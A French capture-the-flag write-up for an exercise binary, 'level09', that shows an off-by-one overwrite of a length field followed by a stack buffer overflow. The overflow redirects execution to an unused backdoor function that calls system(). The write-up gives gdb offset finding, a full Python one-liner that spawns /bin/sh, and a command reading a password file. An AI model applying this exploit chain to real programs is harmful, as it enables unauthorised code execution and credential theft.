Ce programme est un pseudo messagerie qui demande deux argument user and message.

dans ce programme on ce rend compte qu'une fonction __secret_backdoor__ n'est pas utiliser 

```c
void secret_backdoor(void){
    char buff[128];
    fgets(buff, 128, stdin);
    system(buff);
    return ;
}
```


On vas faire en sorte que le programme aille dans cette fonction et lance dans __system__ un __"/bin/sh"__

Pour ce faire le programme nous donne  a disposition une struct qu'il remplit:

```c
struct msn {
    char message[140];
    char username[40];
    int len;

} msg;
```

l'ordre des argument dans la structure et important, parce que la premiere fonction lancer dans le __main__ -> __set_username()__ prend un input et le copie dans __msn.username__ mais il peux copie jusqu’à 1 caractère trop loin ce qui override __msn.len__.

```c
void set_username(struct msn *msg){
    char buff[128];
    int i;
    memset(buff, 0, 128);
    puts(">: Enter your username");
    printf(">>: ");
    fgets(buff, 128, stdin);
    i = 0;
    while (i < 41 && buff[i]) {
        msg->username[i] = buff[i];
        i++;
    }
    printf(">: Welcome, %s", msg->username);
```

Ceci vas nous permettre de set __msn.len__ a 255 pour la suite.

Ensuit nous avont la fonction __set_msg()__ qui vas copie un input dans __msn.message__ en fonction de __msn.len__. Faut que le buffer de __msn.message__ est que de 140. Du coup avec un __msn.len__ a 255 on vas pouvoir faire un overflow pour executer la fonction __secret_backdoor()__.

Place a la pratique:

Nous allons devoir dans un premier temps récupérer l’adresse de __secret_backdoor()__. Pour ce faire nous allons lancer le programme dans __gdb__ puis regarder a quelle adresse __secret_backdoor__ a était assigner:

```bash
gdb ./level09
(gdb) r
Starting program: /home/users/level09/level09
[...]
[Inferior 1 (process 4192) exited normally]
(gdb) disas secret_backdoor
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:     push   %rbp
   [...]
End of assembler dump.
(gdb)
```

On trouve donc l'adresse ==0x000055555555488c==

Maintenant toujours depuis __gdb__ nous allons chercher offset de la copie du message:


```bash
(gdb) r < <(python -c "print 'A'*40 + '\xff' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'")
[...]
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info register
[...]
rbp            0x6741356741346741       0x6741356741346741
[...]
(gdb)
```

On obtient donc l'adresse ==0x6741356741346741== sur __rbp__ ce qui donne un offset de __192__. Sauf qu'il faut aussi compter la taille de l'adresse du coup l'offset et donc de 192 + 8 = __200__.

avec c'est information on peux ecrire un one liner python qu'il set __msn.len__ a 255 puis qui overflow __msn.message__ pour acceder a la fonction __secret_backdoor__. Puis lui passer la string __"/bin/sh""__


```bash
(python -c "print 'A'*40 + '\xff' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'"; cat) | ./level09
```

Il nous reste plus cas :

```bash
cat /home/users/end/.pass
```